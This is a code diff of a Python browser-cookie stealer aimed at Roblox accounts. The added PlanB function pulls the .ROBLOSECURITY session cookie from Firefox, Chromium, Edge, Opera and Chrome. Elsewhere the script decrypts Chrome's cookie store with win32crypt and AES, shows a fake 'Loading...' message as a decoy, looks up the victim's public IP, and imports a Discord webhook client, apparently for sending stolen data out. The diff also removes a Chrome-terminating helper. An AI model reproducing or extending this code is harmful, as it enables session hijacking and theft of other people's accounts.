@@ -1,10 +1,10 @@
 import os
 import json
 import base64
+import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
-import psutil
 import win32crypt
 from Crypto.Cipher import AES
 from discordwebhook import Discord
@@ -19,18 +19,6 @@ webhook_url = 'heh'
 
 dummy_message = "Loading..."
 print(dummy_message)
-
-
-def command(c):
-    os.system(c)
-
-
-def terminate_chrome():
-    for proc in psutil.process_iter(['pid', 'name']):
-        if 'chrome' in proc.info['name'].lower():
-            proc.terminate()
-            return
-
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -78,6 +66,63 @@ def CookieLog():
         return decrypted_value
     db.close()
 
+def PlanB():
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+
+cookies = PlanB()
+
+if CookieLog() == None:
+    PlanB()
 
 def get_local_ip():
     ip = requests.get('http://api.ipify.org').text
